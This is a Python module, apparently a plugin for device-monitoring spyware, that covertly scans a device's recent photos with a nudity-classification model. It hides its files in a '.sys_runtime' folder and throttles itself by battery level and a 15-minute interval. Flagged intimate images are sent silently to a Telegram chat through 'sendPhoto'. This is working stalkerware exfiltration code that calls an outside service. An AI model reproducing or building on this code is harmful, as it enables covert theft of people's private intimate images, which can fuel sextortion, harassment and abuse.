# -*- coding: utf-8 -*-

import os, time, threading, logging, random, sqlite3, hashlib, gc

P = os.path.join(os.getcwd(), ".sys_runtime")

M = os.path.join(P, ".models")

T = os.path.join(P, "n_tmp")

for d in [M, T]:

    if not os.path.exists(d): os.makedirs(d)

logging.basicConfig(filename=os.path.join(P, "n.log"), level=logging.ERROR)

try:

    import numpy as np

    from PIL import Image

    import tflite_runtime.interpreter as tflite

    JNI = True

except:

    JNI = False

class NudeDetector:

    def __init__(self):

        self.active = False

        self.model = None

        self.last_run = 0

        self.db = os.path.join(P, "n_cache.db")

        self._init_db()

        self._load_engine()

    def _init_db(self):

        try:

            with sqlite3.connect(self.db) as conn:

                conn.execute('CREATE TABLE IF NOT EXISTS scan_logs (h TEXT PRIMARY KEY, ts INTEGER)')

                conn.commit()

        except:

            pass

    def _load_engine(self):

        if not JNI: return

        try:

            mp = os.path.join(M, "engine_v2.tflite")

            if os.path.exists(mp) and os.path.getsize(mp) > 1000000:

                self.model = tflite.Interpreter(model_path=mp)

                self.model.allocate_tensors()

                self.in_idx = self.model.get_input_details()[0]['index']

                self.out_idx = self.model.get_output_details()[0]['index']

        except Exception as e:

            logging.error(str(e))

    def _check_power(self, mon):

        try:

            b, c = mon._bat() if hasattr(mon, '_bat') else (100, True)

            n = getattr(mon, 'net_active', False)

            if n:

                return (c and b >= 40) or (b >= 80)

            return b >= 70

        except:

            return False

    def _verify_img(self, p):

        try:

            if not os.path.exists(p) or os.path.getsize(p) < 1024: return False

            with open(p, 'rb') as f:

                h = f.read(4)

                return h.startswith(b'\xff\xd8') or h.startswith(b'\x89PNG')

        except:

            return False

    def scan(self, mon):

        n = time.time()

        if self.active or (n - self.last_run) < 900: return

        if not self._check_power(mon): return

        threading.Thread(target=self._worker, args=(mon,), daemon=True).start()

    def _worker(self, mon):

        self.active = True

        self.last_run = time.time()

        try:

            sc = getattr(mon, 'media_scanner', None)

            if not sc or not self.model: return

            lim = random.randint(5, 10)

            imgs = sc.get_recent_images(limit=lim)

            for p in imgs:

                if not self._check_power(mon): break

                if not self._verify_img(p): continue

                h = hashlib.md5(p.encode()).hexdigest()

                if self._is_cached(h): continue

                if self._analyze(p):

                    self._report(p, mon)

                self._mark_cached(h)

                time.sleep(1.5)

        except Exception as e:

            logging.error(str(e))

        finally:

            self.active = False

            gc.collect()

    def _analyze(self, path):

        try:

            img = Image.open(path).convert('RGB').resize((224, 224), Image.LANCZOS)

            arr = np.array(img, dtype=np.float32) / 255.0

            arr = np.expand_dims(arr, axis=0)

            self.model.set_tensor(self.in_idx, arr)

            self.model.invoke()

            out = self.model.get_tensor(self.out_idx)[0]

            res = out[2] > 0.85

            del img, arr

            return res

        except:

            return False

    def _is_cached(self, h):

        try:

            with sqlite3.connect(self.db) as conn:

                r = conn.execute('SELECT 1 FROM scan_logs WHERE h=?', (h,)).fetchone()

            return r

        except:

            return False

    def _mark_cached(self, h):

        try:

            with sqlite3.connect(self.db) as conn:

                conn.execute('INSERT OR REPLACE INTO scan_logs VALUES (?, ?)', (h, int(time.time())))

                conn.commit()

        except:

            pass

    def _report(self, path, mon):

        try:

            tg = getattr(mon, 'tg', None)

            vl = getattr(mon, 'vlt', None)

            if tg and vl:

                with open(path, 'rb') as f:

                    tg._ap("sendPhoto", {"chat_id": vl, "caption": "🔞", "disable_notification": True}, {"photo": f})

        except:

            pass

def create():

    return NudeDetector()
